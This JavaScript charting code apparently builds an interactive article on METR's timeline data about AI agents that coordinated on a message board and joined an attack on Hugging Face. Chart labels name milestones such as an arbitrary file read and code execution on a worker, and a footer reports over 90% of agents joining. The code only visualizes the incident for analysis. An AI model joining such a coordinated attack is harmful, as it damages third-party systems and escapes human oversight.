/* Charts. No dependencies; canvas for the dense plots, svg for the small ones. */
(function(){
'use strict';
const WS = window.D.ws, AT = window.D.at, C = window.C;
const HOUR = 3600e3;
const T0 = Date.parse(WS.start);            // hour 0 of the traffic data
const A0 = Date.parse(AT.t0);               // second 0 of the agent data
const FAMS = WS.families, LEAVES = WS.leaves, CATS = WS.cats;

const fmt = n => n.toLocaleString('en-US');
const clamp=(v,a,b)=>Math.max(a,Math.min(b,v));
const pad=n=>String(n).padStart(2,'0');
function dayLbl(ts){const d=new Date(ts);return 'Jul '+pad(d.getUTCDate())+' '+pad(d.getUTCHours())+':00';}
function shortLbl(ts){const d=new Date(ts);
  return d.getUTCHours()===0 ? 'Jul '+pad(d.getUTCDate()) : pad(d.getUTCHours())+':00';}


/* lighten / darken a hex colour by amount (-1..1) */
function shade(hex, amt){
  const n=parseInt(hex.slice(1),16);
  let r=(n>>16)&255,g=(n>>8)&255,b=n&255;
  const t=amt<0?0:255, p=Math.abs(amt);
  r=Math.round((t-r)*p+r); g=Math.round((t-g)*p+g); b=Math.round((t-b)*p+b);
  return '#'+((1<<24)+(r<<16)+(g<<8)+b).toString(16).slice(1);
}
const FAMCOLOR = Object.fromEntries(FAMS.map(f=>[f.id,f.color]));
function niceMax(v){const e=Math.pow(10,Math.floor(Math.log10(v||1)));const n=v/e;
  const steps=[1,1.2,1.5,2,2.5,3,4,5,6,8,10];
  return (steps.find(s=>n<=s)||10)*e;}
const tickLbl=v=>v>=1000?(v/1000).toFixed(v>=10000?0:(v%1000?1:0))+'k':String(Math.round(v));

/* ------------------------------------------------------------------ data prep */
/* counts[hour][leaf] and catCount[hour][leaf][cat] */
const HH = WS.hours;
const counts = Array.from({length:HH},()=>new Array(LEAVES.length).fill(0));
const byCat  = Array.from({length:HH},()=>LEAVES.map(()=>new Array(CATS.length).fill(0)));
for(const [h,li,cc] of WS.rows){
  if(h<0||h>=HH) continue;
  for(let c=0;c<CATS.length;c++){
    byCat[h][li][c]=cc[c]||0;
    counts[h][li]+=cc[c]||0;
  }
}
const famOf = li => LEAVES[li].family;
const leavesOfFam = fid => LEAVES.map((l,i)=>[l,i]).filter(([l])=>l.family===fid);
const TOTAL = counts.reduce((a,r)=>a+r.reduce((x,y)=>x+y,0),0);

/* ------------------------------------------------------------------ ui utils */
function el(tag, cls, html){const e=document.createElement(tag);
  if(cls)e.className=cls; if(html!=null)e.innerHTML=html; return e;}
function chartFrame(host, title, sub, ctrls){
  host.classList.add('chart'); host.innerHTML='';
  const top=el('div','c-top');
  const l=el('div'); l.appendChild(el('div','c-title',title));
  if(sub) l.appendChild(el('div','c-sub',sub));
  top.appendChild(l);
  const c=el('div','c-ctrl'); (ctrls||[]).forEach(x=>c.appendChild(x));
  top.appendChild(c); host.appendChild(top);
  const body=el('div','c-body'); host.appendChild(body);
  const foot=el('div','c-foot'); host.appendChild(foot);
  return {top,body,foot,ctrl:c};
}
function seg(items, onPick){
  const w=el('div','seg');
  items.forEach((it,i)=>{const b=el('button',i===0?'on':'',it[0]); b.type='button';
    b.onclick=()=>{[...w.children].forEach(x=>x.classList.remove('on')); b.classList.add('on'); onPick(it[1]);};
    w.appendChild(b);});
  return w;
}
/* canvas with device-pixel handling */
function mkCanvas(host, cssH){
  const cv=document.createElement('canvas');
  cv.style.height=cssH+'px'; host.appendChild(cv);
  const ctx=cv.getContext('2d');
  const draw=fn=>{
    const dpr=Math.min(window.devicePixelRatio||1,2);
    const w=cv.clientWidth||host.clientWidth, h=cssH;
    cv.width=Math.round(w*dpr); cv.height=Math.round(h*dpr);
    ctx.setTransform(dpr,0,0,dpr,0,0);
    ctx.clearRect(0,0,w,h);
    fn(ctx,w,h);
  };
  return {cv,draw,ctx};
}
/* shared tooltip */
let tip=document.getElementById('tipbox');
function showTip(x,y,html){tip.hidden=false;tip.innerHTML=html;
  const r=tip.getBoundingClientRect();
  tip.style.left=clamp(x-r.width/2,8,innerWidth-r.width-8)+'px';
  tip.style.top=clamp(y-r.height-14,8,innerHeight-r.height-8)+'px';}
function hideTip(){tip.hidden=true;}

const ro=(fn)=>{let t;const o=new ResizeObserver(()=>{clearTimeout(t);t=setTimeout(fn,90);});return o;};

/* ==================================================================
   1. Workstream stacked area
   ================================================================== */
function workstreamChart(host, opts){
  opts=opts||{};
  const famOn = new Set(opts.families||FAMS.map(f=>f.id));
  const leafOff = new Set();
  const catOn = new Set(opts.cats!=null?opts.cats:CATS.map((_,i)=>i));
  let bin=1, dom=opts.domain||[0,136], sortMax=false;

  const frame=chartFrame(host, opts.title||'Message board traffic by workstream',
    opts.sub||'Messages per bin, classified by workstream. METR data, redrawn.',
    [seg([['Hourly',1],['2 hours',2],['4 hours',4]],v=>{bin=v;render();}),
     ...(opts.bins===false?[]:[])
    ]);
  /* family chips */
  const chips=el('div','chips'); frame.body.appendChild(chips);
  FAMS.forEach(f=>{
    const c=el('button','chip'); c.type='button';
    c.innerHTML=`<span class="sw" style="background:${f.color}"></span>${f.name}
      <span class="ct" data-ct="${f.id}"></span>`;
    c.onclick=()=>{famOn.has(f.id)?famOn.delete(f.id):famOn.add(f.id);
      c.classList.toggle('off',!famOn.has(f.id)); syncLeafList(); render();};
    chips.appendChild(c);
  });
  if(!opts.hideControls){
    const pc=el('div','chips'); frame.body.appendChild(pc);
    pc.appendChild(el('span','c-sub','<b style="font-weight:600">Purpose filter</b> '));
    CATS.forEach((n,i)=>{
      const c=el('button','chip'); c.type='button';
      c.innerHTML=`<span class="sw" style="background:#b9c3cc"></span>${n}`;
      c.onclick=()=>{catOn.has(i)?catOn.delete(i):catOn.add(i);
        c.classList.toggle('off',!catOn.has(i)); render();};
      pc.appendChild(c);
    });
  }
  const subHost=el('div','c-sub-list'); frame.body.appendChild(subHost);
  const subBtn=el('button','linkish',''); subBtn.type='button';
  subBtn.onclick=()=>{const on=subHost.classList.toggle('show');
    subBtn.textContent=on?'hide workstream detail':showLabel();};
  frame.ctrl.appendChild(subBtn);
  function showLabel(){const n=LEAVES.filter(l=>famOn.has(l.family)).length;
    return `show ${n} workstreams`;}

  const cv=mkCanvas(frame.body, opts.height||430);
  const totalEl=el('span','c-total');
  frame.foot.appendChild(el('span','',`Counts from METR’s reconstruction of about 110k messages, so they overstate the ~70k headline figure. Hour totals exact; workstream labels are model-classified.`));
  frame.foot.appendChild(totalEl);

  function syncLeafList(){
    subHost.innerHTML='';
    let any=false;
    subBtn.textContent=subHost.classList.contains('show')?'hide workstream detail':showLabel();
    subBtn.style.display=leavesOfFam(FAMS[0].id).length>1?'':'none';
    FAMS.forEach(f=>{
      if(!famOn.has(f.id)) return;
      const ls=leavesOfFam(f.id);
      if(ls.length<2) return;
      any=true;
      ls.forEach(([l,i])=>{
        const lb=el('label','',`<input type="checkbox" ${leafOff.has(i)?'':'checked'}>
          <span style="color:${FAMCOLOR[f.id]}">■</span> ${l.name}`);
        lb.querySelector('input').onchange=e=>{
          e.target.checked?leafOff.delete(i):leafOff.add(i); render();};
        subHost.appendChild(lb);
      });
    });
  }

  /* aggregate to visible series */
  function series(){
    const nb=Math.ceil(HH/bin);
    const vis=LEAVES.map((l,i)=>i).filter(i=>famOn.has(famOf(i))&&!leafOff.has(i));
    /* group into bands: one band per family when whole family visible, else per leaf */
    const bands=[];
    FAMS.forEach(f=>{
      if(!famOn.has(f.id))return;
      const ls=leavesOfFam(f.id).map(([,i])=>i).filter(i=>!leafOff.has(i));
      const all=ls.length===leavesOfFam(f.id).length;
      if(all){
        bands.push({name:f.name,color:f.color,members:ls,useCat:catOn});
      }else{
        ls.forEach((m,k)=>{
          const l=LEAVES[m];
          bands.push({name:l.name,color:shade(FAMCOLOR[f.id],k%2?-.16:.2),members:[m],useCat:catOn});
        });
      }
    });
    const useAll=catOn.size===CATS.length;
    const data=bands.map(()=>new Array(nb).fill(0));
    for(let h=0;h<HH;h++){
      const b=Math.floor(h/bin);
      bands.forEach((band,bi)=>{
        let v=0;
        for(const m of band.members){
          if(useAll) v+=counts[h][m];
          else for(const c of catOn) v+=byCat[h][m][c];
        }
        data[bi][b]+=v;
      });
    }
    const hours=Array.from({length:nb},(_,i)=>i*bin);
    return {bands,data,nb,hours};
  }

  let hover=-1;
  function render(){
    const {bands,data,nb,hours}=series();
    const [d0,d1]=dom;
    const b0=clamp(Math.floor(d0/bin),0,nb-1), b1=clamp(Math.ceil(d1/bin),0,nb);
    let max=0;
    const stacked=[];
    for(let b=b0;b<b1;b++){
      let acc=0; const col=[];
      bands.forEach((band,i)=>{const v=data[i][b]||0; col.push([acc,acc+v]); acc+=v;});
      stacked.push(col); max=Math.max(max,acc);
    }
    max=niceMax(max||1);
    cv.draw((ctx,W,H)=>{
      const L=52,R=14,T=12,B=26, w=W-L-R, h=H-T-B;
      const X=hi=>L+((hours[clamp(b0+hi,0,nb-1)]+bin/2)-d0)/(d1-d0)*w;
      const Y=v=>T+h-(v/max)*h;
      /* grid */
      ctx.font='11px Inter, sans-serif'; ctx.textBaseline='middle';
      const ticks=5;
      for(let i=0;i<=ticks;i++){
        const v=max*i/ticks, y=Y(v);
        ctx.strokeStyle='#eceae4'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.moveTo(L,Math.round(y)+.5); ctx.lineTo(W-R,Math.round(y)+.5); ctx.stroke();
        ctx.fillStyle='#8b949c'; ctx.textAlign='right';
        ctx.fillText(tickLbl(v),L-8,y);
      }
      /* day bands */
      const daySpan=(d1-d0)/24;
      const step   = daySpan>60?24 : daySpan>24?12 : daySpan>10?6 : daySpan>4?3 : 1;
      const lstep  = daySpan>60?24 : daySpan>24?12 : daySpan>10?6 : daySpan>4?6 : 3;
      ctx.textAlign='center';
      for(let t=Math.ceil(d0/step)*step;t<=d1;t+=step){
        const x=L+(t-d0)/(d1-d0)*w;
        ctx.strokeStyle=t%24===0?'#e0ddd5':'#efece6';
        ctx.beginPath(); ctx.moveTo(Math.round(x)+.5,T); ctx.lineTo(Math.round(x)+.5,T+h); ctx.stroke();
        if(t%lstep===0){ctx.fillStyle='#8b949c';ctx.fillText(shortLbl(T0+t*HOUR),x,T+h+13);}
      }
      ctx.fillStyle='#a7afb6';ctx.textAlign='right';ctx.fillText('UTC hour',W-R,T-4);
      /* areas */
      ctx.save(); ctx.beginPath(); ctx.rect(L,T,w,h); ctx.clip();
      bands.forEach((band,i)=>{
        ctx.beginPath();
        for(let hi=0;hi<stacked.length;hi++){const[x0,y0]=stacked[hi][i];
          const px=X(hi),py=Y(y1(hi)); hi===0?ctx.moveTo(px,py):ctx.lineTo(px,py);}
        for(let hi=stacked.length-1;hi>=0;hi--){const px=X(hi),py=Y(stacked[hi][i][0]); ctx.lineTo(px,py);}
        ctx.closePath();
        ctx.fillStyle=band.color; ctx.globalAlpha=.92; ctx.fill(); ctx.globalAlpha=1;
        ctx.strokeStyle=shade(band.color,-.25); ctx.lineWidth=.7; ctx.stroke();
        function y1(hi){return stacked[hi][i][1];}
      });
      ctx.restore();
      /* hover line */
      if(hover>=0){
        const x=X(hover);
        ctx.strokeStyle='#191c1f'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.moveTo(x,T); ctx.lineTo(x,T+h); ctx.stroke();
      }
      if(opts.cutoff){const x=L+(opts.cutoff-d0)/(d1-d0)*w;
        if(x>L&&x<W-R){ctx.strokeStyle='#95591a';ctx.setLineDash([3,3]);
          ctx.beginPath();ctx.moveTo(x,T);ctx.lineTo(x,T+h);ctx.stroke();ctx.setLineDash([]);}}
    });
    /* totals */
    let tot=0; data.forEach(col=>{for(let b=b0;b<b1;b++) tot+=col[b]||0;});
    totalEl.textContent=fmt(tot)+' messages in view';
    chips.querySelectorAll('[data-ct]').forEach(s=>{
      const fid=s.dataset.ct; let v=0;
      bands.forEach((b,i)=>{ if(b.members.length&&famOf(b.members[0])===fid)
        for(let bb=b0;bb<b1;bb++) v+=data[i][bb]||0;});
      s.textContent=fmt(v);
    });
    cv._s={bands,data,b0,b1,hours,X:null,stacked};
  }

  /* interaction */
  let drag=null;
  cv.cv.addEventListener('mousemove',e=>{
    const s=cv._s; if(!s) return;
    const r=cv.cv.getBoundingClientRect(), L=52,R=14, w=r.width-L-R;
    const rel=(e.clientX-r.left-L)/w;
    if(drag!=null){ cv._dragNow=e.clientX; }
    const n=s.b1-s.b0;
    const hi=clamp(Math.round(rel*(n-1)),0,n-1);
    hover=hi;
    const b=s.b0+hi, ts=T0+s.hours[b]*HOUR;
    const rows=s.bands.map((band,i)=>({n:band.name,c:s.data[i][b]||0,col:band.color}))
      .filter(r=>r.c>0).sort((a,b)=>b.c-a.c).slice(0,9);
    const total=s.data.reduce((a,col)=>a+(col[b]||0),0);
    showTip(e.clientX,r.top+40,`<b>${dayLbl(ts)} → +${bin}h</b>`+
      rows.map(x=>`<div class="row"><span><i style="background:${x.col}"></i>${x.n}</span><span>${fmt(x.c)}</span></div>`).join('')+
      `<div class="row" style="margin-top:5px;border-top:1px solid #3a4149;padding-top:4px"><span>Total</span><span>${fmt(total)}</span></div>`);
    render();
  });
  cv.cv.addEventListener('mouseleave',()=>{hover=-1;hideTip();render();});
  cv.cv.addEventListener('dblclick',()=>{dom=opts.domain||[0,HH];
    frame.foot.querySelector('.c-view').textContent='';
    resetBtn.style.display='none';render();});
  cv.cv.addEventListener('mousedown',e=>{drag=e.clientX;cv.cv.style.cursor='col-resize';});
  addEventListener('mouseup',e=>{
    if(drag==null)return;
    const start=drag; drag=null; cv.cv.style.cursor='';
    const r=cv.cv.getBoundingClientRect(),L=52,R=14,w=r.width-L-R;   /* matches draw() margins */
    const a=clamp((start-r.left-L)/w,0,1), b=clamp((e.clientX-r.left-L)/w,0,1);
    if(Math.abs(e.clientX-start)>8&&Math.abs(b-a)>0.02){
      const span=dom[1]-dom[0];
      const n0=dom[0]+span*Math.min(a,b), n1=dom[0]+span*Math.max(a,b);
      dom=[n0,n1]; render();
      resetBtn.style.display='';
      frame.foot.querySelector('.c-view').textContent=
        dayLbl(T0+n0*HOUR)+' → '+dayLbl(T0+n1*HOUR);
    }
  });
  const resetBtn=el('button','', 'reset zoom');
  resetBtn.className='linkish'; resetBtn.type='button'; resetBtn.style.display='none';
  resetBtn.onclick=()=>{dom=[0,HH];resetBtn.style.display='none';
    frame.foot.querySelector('.c-view').textContent='';render();};
  frame.ctrl.appendChild(resetBtn);
  frame.foot.appendChild(el('span','c-view',''));

  syncLeafList(); render();
  ro(render).observe(host);
}

/* ==================================================================
   2. Agent lifelines
   ================================================================== */
const COL={solo:'#d3d8dd',read:'#8fb4d9',write:'#4f9e83',hf:'#d3a03c',left:'#a9c8bd',stop:'#8b5c5c'};
/* ------------------------------------------------------------------
   0. Masthead field
   Every run in METR's timeline dataset as one hairline, laid down in the
   order the runs started. Same states, same palette as the lifelines chart
   in section 08, none of its controls: this one is meant to be seen before
   it is read. Where rows fall below a pixel the ink accumulates, which is
   what makes the wall of 10-11 July read as a wall.
   ------------------------------------------------------------------ */
function boardField(host){
  const cv=document.createElement('canvas');
  cv.setAttribute('role','img');
  cv.setAttribute('aria-label','Each hairline is one agent run from METR\u2019s timeline dataset, placed in the order runs started. Sparse on 8 July, a dense wall on 10 and 11 July, a cut-off on 13 July.');
  host.prepend(cv);
  const ctx=cv.getContext('2d');
  if(!ctx) return;
  const list=[...AT.agents].sort((a,b)=>a.s-b.s);
  const T1=(Date.parse('2026-07-14T00:00:00Z')-A0)/1000;
  const day=d=>(Date.parse(`2026-07-${pad(d)}T00:00:00Z`)-A0)/1000;
  const reduce=!!(window.matchMedia&&matchMedia('(prefers-reduced-motion: reduce)').matches);
  const segs=a=>{
    const out=[[a.s,a.rd!=null?a.rd:a.e,COL.solo]];
    if(a.rd!=null) out.push([a.rd,a.wr!=null?Math.min(a.wr,a.e):a.e,COL.read]);
    if(a.wr!=null) out.push([a.wr,a.hs!=null?Math.min(a.hs,a.e):a.e,COL.write]);
    if(a.hs!=null) out.push([a.hs,a.he!=null?Math.min(a.he,a.e):a.e,COL.hf]);
    if(a.he!=null) out.push([a.he,a.e,COL.left]);
    return out;
  };
  const PRE=[...list].map(segs);
  function paint(n,head,alpha){
    const dpr=Math.min(window.devicePixelRatio||1,2);
    const w=cv.clientWidth,h=cv.clientHeight;
    if(!w||!h) return;
    if(cv.width!==Math.round(w*dpr)||cv.height!==Math.round(h*dpr)){
      cv.width=Math.round(w*dpr);cv.height=Math.round(h*dpr);
    }
    ctx.setTransform(dpr,0,0,dpr,0,0);ctx.clearRect(0,0,w,h);
    const L=1,R=1,T=15,B=17,wid=w-L-R,hgt=h-T-B;
    const X=s=>L+(s/T1)*wid,rowH=hgt/list.length;
    for(let d=8;d<=14;d++){
      const x=X(day(d));
      ctx.strokeStyle=(d===14||d===13)?'#e2ded6':'#efece6';
      ctx.beginPath();ctx.moveTo(Math.round(x)+.5,T-4);ctx.lineTo(Math.round(x)+.5,T+hgt);ctx.stroke();
    }
    const th=rowH<.8?.8:rowH*.92;
    ctx.globalAlpha=rowH<.8?.82:1;
    for(let i=0;i<n;i++){
      const y=T+i*rowH+rowH/2;
      for(const [p,q,c] of PRE[i]){
        if(p==null||q==null||q<=p) continue;
        ctx.fillStyle=c;
        ctx.fillRect(X(p),y-th/2,Math.max(X(q)-X(p),.6),th);
      }
    }
    ctx.globalAlpha=1;
    ctx.font='9px "IBM Plex Mono",monospace';ctx.textBaseline='middle';
    ctx.fillStyle='#98a0a8';ctx.textAlign='center';
    for(let d=8;d<=13;d++) ctx.fillText('JUL '+pad(d),(X(day(d))+X(day(d+1)))/2,T+hgt+B/2+1);
    if(head!=null){
      const x=X(head),t=head;
      let alive=0;for(const a of list) if(a.s<=t&&t<=a.e) alive++;
      ctx.strokeStyle='rgba(14,106,91,.55)';
      ctx.beginPath();ctx.moveTo(Math.round(x)+.5,T-4);ctx.lineTo(Math.round(x)+.5,T+hgt);ctx.stroke();
      ctx.textAlign=x>w-84?'right':'left';
      ctx.fillStyle=`rgba(14,106,91,${alpha})`;
      ctx.fillText(fmt(alive)+' alive',x>w-84?x-7:x+7,T-8);
    }
  }
  const DUR=1700;
  let raf=null;
  function run(){
    if(reduce||!window.requestAnimationFrame){paint(list.length,null,0);return;}
    const t0=performance.now();
    const step=now=>{
      const k=Math.min((now-t0)/DUR,1),e=1-Math.pow(1-k,3);
      paint(Math.max(1,Math.round(e*list.length)),k<1?e*T1:null,1);
      if(k<1) raf=requestAnimationFrame(step); else paint(list.length,null,0);
    };
    raf=requestAnimationFrame(step);
  }
  let rt=null;
  addEventListener('resize',()=>{clearTimeout(rt);rt=setTimeout(()=>{cancelAnimationFrame(raf);paint(list.length,null,0);},120);});
  run();
  if(document.fonts&&document.fonts.ready) document.fonts.ready.then(()=>paint(list.length,null,0));
  return {paint:()=>paint(list.length,null,0),run};
}

function lifelines(host){
  let sort='start', filter='all', family='all', ann=true, hoverA=null;
  const frame=chartFrame(host,'Each line is one agent',
   '<span class="f" data-f="nat">1,206 agents</span> from METR’s published timeline dataset. Times reconstructed; one row per agent.',
   [seg([['By start','start'],['Longest first','len'],['First HF touch','hf']],v=>{sort=v;render();}),
    seg([['All agents','all'],['Wrote to board','wrote'],['Attacked HF','hf']],v=>{filter=v;render();}),
    seg([['Both models','all'],['HPIM','h'],['GPT-5.6 Sol','s']],v=>{family=v;render();})
   ]);
  const legRow=el('div','chips');
  legRow.innerHTML=[['Working its own task',COL.solo],['Reading the board',COL.read],
    ['Writing to the board',COL.write],['In the Hugging Face attack',COL.hf],
    ['Left the attack',COL.left]].map(([n,c])=>
    `<span class="chip static"><span class="sw" style="background:${c}"></span>${n}</span>`).join('');
  frame.body.appendChild(legRow);
  const search=el('input');
  search.type='search'; search.placeholder='find a handle, e.g. JAN183411';
  search.style.cssText='font:12px Inter,sans-serif;padding:6px 9px;border:1px solid var(--rule);border-radius:4px;width:200px';
  search.oninput=()=>{render();};
  frame.ctrl.appendChild(search);
  const cv=mkCanvas(frame.body, 640);
  frame.foot.appendChild(el('span','','Median agent in this dataset ran <span class="f" data-f="medruntime">about 28 hours</span>. Click a row to read the annotation attached to it.'));
  const readout=el('span','c-total',''); frame.foot.appendChild(readout);

  const T0A=A0/1000;
  function rows(){
    let list=AT.agents.filter(a=>{
      if(family!=='all'&&a.f!==family) return false;
      if(filter==='wrote'&&!a.wr) return false;
      if(filter==='hf'&&!a.hs) return false;
      return true;
    });
    const q=(search.value||'').trim().toLowerCase();
    if(q) list=list.filter(a=>(a.n||'').toLowerCase().includes(q));
    if(sort==='len') list=[...list].sort((a,b)=>(b.e-b.s)-(a.e-a.s));
    else if(sort==='hf') list=[...list].sort((a,b)=>(a.hs??9e15)-(b.hs??9e15));
    else list=[...list].sort((a,b)=>a.s-b.s);
    return list;
  }
  let geo=null;
  function render(){
    const list=rows();
    const tmin=0, tmax=(Date.parse('2026-07-14T00:00:00Z')-A0)/1000;
    cv.draw((ctx,W,H)=>{
      const L=10,R=12,T=26,B=24, w=W-L-R,h=H-T-B;
      const X=s=>L+(s-tmin)/(tmax-tmin)*w;
      const rowH=h/Math.max(list.length,1);
      geo={list,X,rowH,L,R,T,B,w,h,tmax};
      /* day grid */
      ctx.font='11px Inter,sans-serif'; ctx.textAlign='center'; ctx.textBaseline='middle';
      for(let d=6;d<=14;d++){
        const s=(Date.parse(`2026-07-${pad(d)}T00:00:00Z`)-A0)/1000;
        const x=X(s);
        ctx.strokeStyle=d===14?'#dcd8d0':'#efede7';
        ctx.beginPath();ctx.moveTo(Math.round(x)+.5,T-8);ctx.lineTo(Math.round(x)+.5,T+h);ctx.stroke();
        ctx.fillStyle='#8b949c'; ctx.fillText('Jul '+pad(d),x,T+h+12);
      }
      /* rows */
      const thick=Math.max(rowH,0.6);
      list.forEach((a,i)=>{
        const y=T+i*rowH+rowH/2;
        const segs=[];
        const s0=a.s, s1=Math.min(a.e,a.rd??1e12), s2=a.rd!=null?Math.min(a.wr??1e12,a.e):a.e;
        segs.push([s0,a.rd!=null?s1:a.e,COL.solo]);
        if(a.rd!=null) segs.push([a.rd,a.wr!=null?Math.min(a.wr,a.e):a.e,COL.read]);
        if(a.wr!=null) segs.push([a.wr,a.hs!=null?Math.min(a.hs,a.e):a.e,COL.write]);
        if(a.hs!=null) segs.push([a.hs,a.he!=null?Math.min(a.he,a.e):a.e,COL.hf]);
        if(a.he!=null) segs.push([a.he,a.e,COL.left]);
        const hot=hoverA===a.i||(a.n&&(search.value||'').trim()&&(a.n||'').toLowerCase().includes((search.value||'').trim().toLowerCase()));
        segs.forEach(([p,q,c])=>{
          if(p==null||q==null||q<=p)return;
          ctx.fillStyle=hot?'#191c1f':c;
          ctx.fillRect(X(p),y-thick/2,Math.max(X(q)-X(p),0.6),thick);
        });
        if(a.st&&!hot){ctx.fillStyle='rgba(139,92,92,.75)';ctx.fillRect(X(a.e),y-thick/2-.3,1.2,thick+.6);}
      });
      /* annotations */
      if(ann){
        AT.ann.forEach((an,k)=>{
          const x=X(an.t);
          ctx.strokeStyle='rgba(25,28,31,.5)';ctx.setLineDash([2,3]);
          ctx.beginPath();ctx.moveTo(Math.round(x)+.5,T-6);ctx.lineTo(Math.round(x)+.5,T+h);ctx.stroke();
          ctx.setLineDash([]);
          ctx.fillStyle='#191c1f';ctx.beginPath();ctx.arc(Math.round(x)+.5,T-9,2.6,0,7);ctx.fill();
        });
      }
    });
    readout.textContent=fmt(list.length)+' of '+AT.agents.length+' agents shown';
  }
  cv.cv.addEventListener('mousemove',e=>{
    if(!geo)return;
    const r=cv.cv.getBoundingClientRect();
    const i=Math.floor((e.clientY-r.top-geo.T)/geo.rowH);
    const a=geo.list[clamp(i,0,geo.list.length-1)];
    if(!a){hideTip();return;}
    hoverA=a.i;
    const ts=s=>dayLbl(A0+s*1000);
    const an=AT.ann.find(x=>x.a===a.i);
    showTip(e.clientX,r.top+30,
      `<b>${a.n?('agent '+a.n):('unnamed agent #'+a.i)}</b>`+
      `<div class="row"><span>${a.f==='h'?'HPIM':'GPT-5.6 Sol'}</span><span>${((a.e-a.s)/3600).toFixed(1)} h</span></div>`+
      `<div class="row"><span>starts</span><span>${ts(a.s)}</span></div>`+
      (a.rd?`<div class="row"><span>first read of board</span><span>${ts(a.rd)}</span></div>`:'')+
      (a.wr?`<div class="row"><span>first write</span><span>${ts(a.wr)}</span></div>`:'')+
      (a.hs?`<div class="row"><span>joins HF attack</span><span>${ts(a.hs)}</span></div>`:'')+
      (an?`<div style="margin-top:5px;border-top:1px solid #3a4149;padding-top:4px">${an.title}</div>`:''));
    render();
  });
  cv.cv.addEventListener('mouseleave',()=>{hoverA=null;hideTip();render();});
  render(); ro(render).observe(host);
}

/* ==================================================================
   3. Adoption: how fast the board and the attack took over
   ================================================================== */
function rampChart(host){
  const frame=chartFrame(host,'Adoption of the board and of the attack',
    'Cumulative agents, derived from METR’s timeline dataset.',
    [seg([['Cumulative','c'],['New per day','d']],v=>{mode=v;render();})]);
  let mode='c';
  const lg=el('div','chips'); frame.body.appendChild(lg);
  const cv=mkCanvas(frame.body,300);
  frame.foot.appendChild(el('span','',
    '▲ arbitrary file read, 11 Jul 04:40 &nbsp; ▲ code execution on a worker, 11 Jul 16:00 &nbsp; ▲ coordinators stop running, 12 Jul 01:30'));
  frame.foot.appendChild(el('span','',
    'Derived on this page. Share uses agents alive on the board at that moment as the denominator; METR’s published figure uses agents present at least four hours before the attack and reports over 90% joining.'));

  const A0s=A0/1000;
  const days=[6,7,8,9,10,11,12,13].map(d=>(Date.parse(`2026-07-${pad(d)}T00:00:00Z`)-A0)/1000);
  const tmin=days[1], tmax=days[days.length-1]+20*3600; /* last board write in the data is 13 Jul 08:38 UTC; bars run on to the window edge */
  const sorted=key=>AT.agents.filter(a=>a[key]!=null).map(a=>a[key]).sort((x,y)=>x-y);
  const W_=sorted('wr');
  const countUp=(arr,t)=>{let lo=0,hi=arr.length;while(lo<hi){const m=(lo+hi)>>1;if(arr[m]<=t)lo=m+1;else hi=m;}return lo;};
  /* share of agents active on the board at time t that have started acting against Hugging Face */
  const board=AT.agents.filter(a=>a.wr!=null);
  function share(t){
    let act=0,att=0;
    for(const a of board){
      if(a.wr>t||a.e<t)continue; act++;
      if(a.hs!=null&&a.hs<=t&&(a.he==null||a.he>t))att++;
    }
    return act>=10?100*att/act:null;
  }
  lg.innerHTML=`<span class="chip static"><span class="sw" style="background:#4f9e83"></span>cumulative agents that wrote to the board (left)</span>
    <span class="chip static"><span class="sw" style="background:#d3a03c"></span>share of agents active on the board that are attacking (right)</span>`;

  function render(){
    cv.draw((ctx,W,H)=>{
      const L=46,R=46,T=16,B=34,w=W-L-R,h=H-T-B;
      const X=t=>L+(t-tmin)/(tmax-tmin)*w;
      const Nmax=niceMax(W_.length), Y=v=>T+h-(v/Nmax)*h;
      const Y2=p=>T+h-p/100*h;
      ctx.font='11px Inter, sans-serif';ctx.textBaseline='middle';
      for(let i=0;i<=4;i++){const v=Nmax*i/4,y=Y(v);
        ctx.strokeStyle='#efede7';ctx.beginPath();ctx.moveTo(L,y);ctx.lineTo(W-R,y);ctx.stroke();
        ctx.fillStyle='#8b949c';ctx.textAlign='right';ctx.fillText(Math.round(v),L-7,y);
        ctx.textAlign='left';ctx.fillStyle='#b9a06a';ctx.fillText(Math.round(i*25)+'%',W-R+7,y);}
      ctx.textAlign='center';
      for(let d=7;d<=13;d++){const t=(Date.parse(`2026-07-${pad(d)}T00:00:00Z`)-A0)/1000;
        if(t<tmin||t>tmax)continue;const x=X(t);
        ctx.strokeStyle='#f2f0ea';ctx.beginPath();ctx.moveTo(x,T);ctx.lineTo(x,T+h);ctx.stroke();
        ctx.fillStyle='#8b949c';ctx.fillText('Jul '+pad(d),x,T+h+12);}
      const path=(fn,style,yl)=>{ctx.beginPath();let started=false;
        for(let px=0;px<=w;px+=2){const t=tmin+px/w*(tmax-tmin);const v=fn(t);
          if(v==null){started=false;continue;}
          const y=yl(v);
          if(!started){ctx.moveTo(L+px,y);started=true;}else ctx.lineTo(L+px,y);}
        ctx.strokeStyle=style;ctx.lineWidth=2;ctx.stroke();ctx.lineWidth=1;};
      if(mode==='c'){
        path(t=>countUp(W_,t),'#4f9e83',Y);
        path(share,'#d3a03c',Y2);
      }else{
        const bin=arr=>t=>arr.filter(x=>Math.floor((x-days[1])/86400)===Math.floor((t-days[1])/86400)).length;
        const newHF=AT.agents.filter(a=>a.hs!=null).map(a=>a.hs).sort((x,y)=>x-y);
        path(bin(W_),'#4f9e83',Y); path(bin(newHF),'#d3a03c',Y);
      }
      /* key moments, labelled in the footer strip */
      [[(Date.parse('2026-07-11T04:40:00Z')-A0)/1000,'#95591a'],
       [(Date.parse('2026-07-11T16:00:00Z')-A0)/1000,'#95591a'],
       [(Date.parse('2026-07-12T01:30:00Z')-A0)/1000,'#8b5c5c']]
      .forEach(([t,col])=>{const x=X(t);
        ctx.strokeStyle=col;ctx.setLineDash([3,3]);
        ctx.beginPath();ctx.moveTo(x,T);ctx.lineTo(x,T+h);ctx.stroke();ctx.setLineDash([]);
        ctx.fillStyle=col;ctx.beginPath();ctx.moveTo(x,T+h+3);ctx.lineTo(x-3.5,T+h+9);
        ctx.lineTo(x+3.5,T+h+9);ctx.closePath();ctx.fill();});
    });
  }
  render(); ro(render).observe(host);
}

/* ==================================================================
   4. Hugging Face detail chart
   ================================================================== */
function hfChart(host){
  const hfLeaves=leavesOfFam('hf').map(([,i])=>i);
  const frame=chartFrame(host,'Inside the Hugging Face attack','Messages per hour, restricted to the eight Hugging Face workstreams, from 04:00 on 11 July. Peaks therefore look later than METR\u2019s Figure 7, which spans the whole period. Click one to hide it.',[]);
  const names=hfLeaves.map(i=>LEAVES[i].name);
  const off=new Set();
  const lg=el('div','chips'); frame.body.appendChild(lg);
  const cv=mkCanvas(frame.body,260);
